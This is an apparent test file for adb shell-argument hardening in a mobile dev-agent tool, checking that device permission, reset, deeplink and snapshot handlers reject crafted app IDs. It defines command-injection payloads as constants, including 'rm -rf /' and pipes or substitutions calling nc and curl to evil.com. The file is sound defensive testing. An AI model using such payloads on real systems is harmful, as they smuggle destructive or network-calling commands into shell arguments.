// Phase 134.2 — adb shell-arg hardening. Tests that every tool which
// passes a caller-controlled `appId` / `packageName` into `adb shell` now
// validates it at the entry point against the bundle-ID regex from
// `domain/maestro-validator.ts` (`isValidBundleId`).
//
// Closes 5 deepsec HIGH findings — appId reached adb shell pm/am/pidof
// without constraint, so a metachar-laden appId would inject commands
// on the connected Android device.
//
// Sites covered:
//   - device_permission (grant/revoke/reset/query/snapshot variants)
//   - device_reset_state (forwards to permission + terminate + launch helpers)
//   - device_deeplink (Android branch: `adb shell am start -d <url> -n <packageName>`)
//   - device_snapshot (action=open, attachOnly=true → `adb shell pidof <bundleId>`)
//
// In each case: the validation MUST fire before any adb invocation, so
// we don't need an emulator running — the handler must short-circuit.
import { test } from 'node:test';
import assert from 'node:assert/strict';

function parseEnvelope(result) {
  return JSON.parse(result.content[0].text);
}

// ── Attack payloads ────────────────────────────────────────────────

const VALID_APPID = 'com.rndevagent.testapp';
const VALID_HYPHENATED = 'com.rn-dev-agent.testapp';
const ATTACK_NEWLINE = 'com.example.app\nrm -rf /';
const ATTACK_SHELL_METACHARS = 'com.example;rm -rf /';
const ATTACK_BACKTICK = 'com.example.app`whoami`';
const ATTACK_PIPE = 'com.example|nc evil.com 8080';
const ATTACK_SUBSTITUTION = 'com.example$(curl evil.com)';

// ── device_permission ───────────────────────────────────────────────

test('Phase 134.2: device_permission rejects newline-injected appId before adb', async () => {
  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
  const handler = createDevicePermissionHandler();
  const r = await handler({
    action: 'revoke',
    permission: 'notifications',
    appId: ATTACK_NEWLINE,
    platform: 'android',
  });
  assert.equal(r.isError, true);
  const env = parseEnvelope(r);
  assert.match(env.error, /invalid|appId|bundle/i);
});

test('Phase 134.2: device_permission rejects shell-metachar appId before adb', async () => {
  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
  const handler = createDevicePermissionHandler();
  for (const malicious of [ATTACK_SHELL_METACHARS, ATTACK_BACKTICK, ATTACK_PIPE, ATTACK_SUBSTITUTION]) {
    const r = await handler({
      action: 'grant',
      permission: 'camera',
      appId: malicious,
      platform: 'android',
    });
    assert.equal(r.isError, true, `Expected error for appId ${JSON.stringify(malicious)}`);
    const env = parseEnvelope(r);
    assert.match(env.error, /invalid|appId|bundle/i, `Expected validation error for ${malicious}`);
  }
});

test('Phase 134.2: device_permission rejects malicious appId on QUERY action too (no exception)', async () => {
  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
  const handler = createDevicePermissionHandler();
  const r = await handler({
    action: 'query',
    permission: 'all',
    appId: ATTACK_NEWLINE,
    platform: 'android',
  });
  assert.equal(r.isError, true);
});

test('Phase 134.2: device_permission preserves iOS-only rejection (CDP-014 regression preserved)', async () => {
  // The earlier validation for unknown platforms still fires. Our new
  // bundle-ID check should not regress that path.
  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
  const handler = createDevicePermissionHandler();
  const r = await handler({
    action: 'revoke',
    permission: 'notifications',
    appId: VALID_APPID,
    platform: 'andriod',
  });
  assert.equal(r.isError, true);
  const env = parseEnvelope(r);
  assert.equal(env.code, 'INVALID_PLATFORM');
});

// ── device_reset_state ──────────────────────────────────────────────

test('Phase 134.2: device_reset_state rejects newline-injected appId before any step', async () => {
  const { createDeviceResetStateHandler } = await import('../../dist/tools/device-reset-state.js');
  // Pass a fake getClient — the validator should short-circuit before
  // any CDP work.
  const handler = createDeviceResetStateHandler(() => ({ connectedTarget: null, isConnected: false }));
  const r = await handler({
    appId: ATTACK_NEWLINE,
    platform: 'android',
  });
  assert.equal(r.isError, true);
  const env = parseEnvelope(r);
  assert.match(env.error, /invalid|appId|bundle/i);
});

test('Phase 134.2: device_reset_state rejects shell-metachar appId', async () => {
  const { createDeviceResetStateHandler } = await import('../../dist/tools/device-reset-state.js');
  const handler = createDeviceResetStateHandler(() => ({ connectedTarget: null, isConnected: false }));
  const r = await handler({
    appId: ATTACK_SHELL_METACHARS,
    platform: 'android',
  });
  assert.equal(r.isError, true);
});

// ── device_deeplink ────────────────────────────────────────────────

test('Phase 134.2: device_deeplink rejects newline-injected packageName before adb', async () => {
  const { createDeviceDeeplinkHandler } = await import('../../dist/tools/device-deeplink.js');
  const handler = createDeviceDeeplinkHandler();
  const r = await handler({
    url: 'rndatest://foo',
    packageName: ATTACK_NEWLINE,
    platform: 'android',
  });
  assert.equal(r.isError, true);
  const env = parseEnvelope(r);
  assert.match(env.error, /invalid|packageName|package/i);
});

test('Phase 134.2: device_deeplink rejects shell-metachar packageName', async () => {
  const { createDeviceDeeplinkHandler } = await import('../../dist/tools/device-deeplink.js');
  const handler = createDeviceDeeplinkHandler();
  const r = await handler({
    url: 'rndatest://foo',
    packageName: ATTACK_BACKTICK,
    platform: 'android',
  });
  assert.equal(r.isError, true);
});

// ── Backward parity — valid inputs still work past validation ──────
// These tests prove validation passes for legitimate bundle IDs. They
// don't assert the downstream adb call succeeds (would need an emulator)
// — only that the handler reaches the post-validation path. We detect
// "post-validation" by the absence of an "invalid bundle" error, even
// if the actual adb call fails with a non-validation error.

test('Phase 134.2: device_permission accepts a standard reverse-DNS appId past validation', async () => {
  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
  const handler = createDevicePermissionHandler();
  const r = await handler({
    action: 'query',
    permission: 'all',
    appId: VALID_APPID,
    platform: 'android',
  });
  // May error from adb-not-installed or similar, but NOT with our
  // bundle-validation error. If the error message mentions "invalid"
  // or "bundle", we have a regression on the valid-input path.
  if (r.isError) {
    const env = parseEnvelope(r);
    assert.doesNotMatch(env.error ?? '', /invalid bundle/i,
      'Valid bundle ID was incorrectly rejected as invalid');
  }
});

test('Phase 134.2: device_permission accepts hyphenated bundle ID (Expo apps)', async () => {
  // Multi-LLM review of 134.1 caught the hyphen-less regex; the validator
  // module now accepts hyphens. Confirm device_permission inherits.
  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
  const handler = createDevicePermissionHandler();
  const r = await handler({
    action: 'query',
    permission: 'all',
    appId: VALID_HYPHENATED,
    platform: 'android',
  });
  if (r.isError) {
    const env = parseEnvelope(r);
    assert.doesNotMatch(env.error ?? '', /invalid bundle/i);
  }
});

// ── device_snapshot (action=open, attachOnly=true) ─────────────────

test('Phase 134.2: device_snapshot action=open rejects newline-injected appId before adb pidof', async () => {
  const { createDeviceSnapshotHandler } = await import('../../dist/tools/device-session.js');
  const handler = createDeviceSnapshotHandler();
  const r = await handler({
    action: 'open',
    appId: ATTACK_NEWLINE,
    platform: 'android',
    attachOnly: true,
  });
  assert.equal(r.isError, true);
  const env = parseEnvelope(r);
  assert.match(env.error, /invalid|appId|bundle/i);
});

test('Phase 134.2: device_snapshot action=open rejects shell-metachar appId', async () => {
  const { createDeviceSnapshotHandler } = await import('../../dist/tools/device-session.js');
  const handler = createDeviceSnapshotHandler();
  const r = await handler({
    action: 'open',
    appId: ATTACK_BACKTICK,
    platform: 'android',
    attachOnly: true,
  });
  assert.equal(r.isError, true);
});

test('Phase 134.2: device_deeplink without packageName works (optional arg unchanged)', async () => {
  // packageName is optional — when omitted, no validation is needed.
  const { createDeviceDeeplinkHandler } = await import('../../dist/tools/device-deeplink.js');
  const handler = createDeviceDeeplinkHandler();
  const r = await handler({
    url: 'rndatest://foo',
    platform: 'android',
    // packageName intentionally omitted
  });
  if (r.isError) {
    const env = parseEnvelope(r);
    assert.doesNotMatch(env.error ?? '', /invalid (bundle|packageName)/i,
      'Omitting packageName should not trigger validation');
  }
});
